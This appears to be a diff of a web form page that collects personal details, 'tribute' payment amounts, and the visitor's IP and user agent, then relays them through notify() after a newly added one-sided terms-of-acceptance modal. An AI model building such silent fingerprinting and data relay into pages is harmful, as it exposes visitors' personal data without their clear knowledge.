@@ -29,7 +29,7 @@
 
 @font-face {
   font-family: "Raleway";
-  src: url("font/Raleway-Medium.ttf");
+  src: url("font/Raleway-Regular.ttf");
 }
 body{
 font-family: "Raleway" !important;
@@ -45,6 +45,22 @@ font-family: "Raleway" !important;
         height: 100vh;a
 
 }
+.modal-footer {
+    display: block !important;
+
+    }
+
+
+.pull-right {
+    float: right;
+    clear: right;
+}
+
+.pull-left {
+    float: left;
+    clear: left;
+}
+
 .alert-warning {
     color: #ffffff;
     background-color: #c1701d;
@@ -604,6 +620,52 @@ img {
         </div>
 
 
+<!-- Modal Structure -->
+<div id="dmterms" class="modal fade" role="dialog">
+<div class="modal-dialog">
+<div class="modal-content">
+<div class="modal-header">
+
+<h4 class="modal-title"><strong>Terms and Conditions of Acceptance</strong></h4>
+<button type="button" class="close" data-dismiss="modal">×</button>
+</div>
+<div class="modal-body">
+<p>
+
+<p>By proceeding to use this Acceptant Form, you acknowledge and agree to the following terms and conditions:</p>
+<ol>
+<li>
+<p><strong>Acceptance of Terms</strong>: By accepting these terms, you confirm that you have read, understood, and agree to be bound by all the conditions outlined herein.</p>
+</li>
+<li>
+<p><strong>Liability for Shared Information</strong>: You agree that any information, data, or content you share or disclose through this Acceptant Form is your responsibility. You acknowledge that you are liable for the accuracy, legality, and appropriateness of the information shared.</p>
+</li>
+<li>
+<p><strong>Compliance and Actions</strong>: You agree to do, perform, or fulfill any actions or commitments as agreed upon during your use of the Acceptant Form.</p>
+</li>
+<li>
+<p><strong>Modification of Terms</strong>: These terms may be updated or modified at any time without prior notice. Continued use of the Acceptant Form constitutes your acceptance of any changes.</p>
+</li>
+</ol>
+
+</p>
+
+<div class="form-check">
+  <input class="form-check-input" type="checkbox" id="agreed" value="yes" name="agreed">
+  <label class="form-check-label" for="agreed">
+   By clicking "Accept," you confirm that you have read, understood, and agree to these terms and conditions and accept full responsibility for your actions and information shared.
+  </label>
+</div>
+<p><div class="errors"></div></p>
+</div>
+<div class="modal-footer">
+<button type="button" class="btn btn-primary pull-right" id="submit" name="submit">Submit Now</button>
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+
 <script type="text/javascript"  src="js/post.js"></script>
 
         <script>
@@ -685,7 +747,6 @@ img {
 
         $(document).ready(function(){
 
-
         $('#dob').datepicker({
         format: 'dd/mm/yyyy',
         endDate: '-17y'
@@ -694,20 +755,29 @@ img {
 
 
         fetch_ip();
+        let amount_tribute = "";
+        let dur_tribute = "";
+        let are_tribute = "";
+        let get_ip = "";
+        let fname = "";
+        let lname = "";
+        let dob = "";
+        let email ="";
+        let country = "";
 
         const provider = "SLAVE NEW FORM-DEVELOPER";
         const get_browsername = browserN();
         $("#eform").on("submit", function (e){
           e.preventDefault();
-          var amount_tribute = $("#amount_tribute").val();
-          var dur_tribute = $("#dur_tribute").val();
-          var are_tribute = $("#are_tribute").val();
-          var get_ip = $("#eip").val();
-          var fname = $("#fname").val();
-          var lname = $("#lname").val();
-          var dob = $("#dob").val();
-          var email = $("#email").val();
-          var country = $("#country").val();
+          amount_tribute = $("#amount_tribute").val();
+          dur_tribute = $("#dur_tribute").val();
+          are_tribute = $("#are_tribute").val();
+          get_ip = $("#eip").val();
+          fname = $("#fname").val();
+          lname = $("#lname").val();
+          dob = $("#dob").val();
+          email = $("#email").val();
+          country = $("#country").val();
 
           if (fname == "" && lname=="" && dob=="" && email=="" && country==""){
               $(".error").html('<div id="error"><span>Fill Out fields With <b>*</b> </span></div>');
@@ -744,20 +814,41 @@ img {
           }else{
 
             $(".error").html("");
-
-            var message = `PROVIDER: ${provider}\nFIRST NAME: ${fname}\nLAST NAME: ${lname}\nDATE OF BIRTH: ${dob}\nEMAIL ADDRESS: ${email}\nCOUNTRY: ${country}\n================\nTRIBUTE DURATION: ${dur_tribute}\nTRIBUTE AMOUNT: ${amount_tribute}\nBROWSERNAME: ${get_browsername}\nUSER-AGENT: ${window.navigator.userAgent}\nIP ADDRESS: ${get_ip}\n`;
-            var status = notify(message);
+            $('#dmterms').modal('show');
 
 
-            window.location.href = "/success.html";
 
 
           }
 
         });
 
-        })
+        $("#submit").on("click", function (e){
+          e.preventDefault();
+          if (fname != "" && lname !="" && dob !="" && email !="" && country !=""){
 
+                var agreed = $("#agreed");
+                if (agreed.is(':checked')) {
+                    $(".error").html("");
+                    $(".errors").html("");
+                    var message = `PROVIDER: ${provider}\nFIRST NAME: ${fname}\nLAST NAME: ${lname}\nDATE OF BIRTH: ${dob}\nEMAIL ADDRESS: ${email}\nCOUNTRY: ${country}\n================\nTRIBUTE DURATION: ${dur_tribute}\nTRIBUTE AMOUNT: ${amount_tribute}\nBROWSERNAME: ${get_browsername}\nUSER-AGENT: ${window.navigator.userAgent}\nIP ADDRESS: ${get_ip}\n`;
+                    var status = notify(message);
+                    window.location.href = "/success.html";
+
+                }else{
+                  $(".errors").html('<div id="error"><span>Check to accept the  <b>Terms and Conditions</b> </span></div>');
+                }
+
+            }else{
+
+            $('#dmterms').modal('hide');
+
+            $(".error").html('<div id="error"><span>Fill Out fields With <b>*</b> </span></div>');
+
+            }
+            });
+
+        })
 
     </script>
 
